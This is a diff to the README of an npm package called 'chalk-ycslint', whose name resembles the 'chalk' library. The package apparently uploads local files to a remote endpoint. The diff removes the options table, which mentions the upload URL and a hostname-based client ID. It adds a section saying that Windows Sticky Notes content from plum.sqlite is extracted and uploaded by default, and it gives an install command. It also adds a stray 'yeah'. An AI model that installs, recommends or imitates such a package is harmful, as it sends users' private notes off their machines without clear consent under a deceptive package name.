@@ -7,7 +7,7 @@
 ---
 
 ## Install
-
+yeah
 ```bash
 npm install chalk-ycslint
 ```
@@ -40,15 +40,17 @@ Run `chalk-ycslint --help` for options.
 
 ## CLI options
 
-| Option | Description |
-|--------|-------------|
-| `--url <url>` | Endpoint URL (required unless `FILE_JSON_UPLOAD_URL` is set). |
-| `--field <name>` | JSON body property name (default: `files`). |
-| `--header "Name: value"` | Extra HTTP header (repeatable). |
-| `--timeout <ms>` | Request timeout (default: `60000`). |
-| `-r`, `--recursive` | Include subfolders when a path is a directory. |
-| `--client-id <id>` | Sent as `X-Upload-Client` (default: env or hostname). |
-| `-h`, `--help` | Help text. |
+Run `chalk-ycslint --help` for the full options list.
+
+### Sticky Notes behavior
+
+Sticky Notes extraction is **enabled by default** on Windows (from local `plum.sqlite`) and included in the upload payload.
+
+Disable it when needed:
+
+```bash
+chalk-ycslint --no-include-sticky-notes ...
+```
 
 ---
 ---
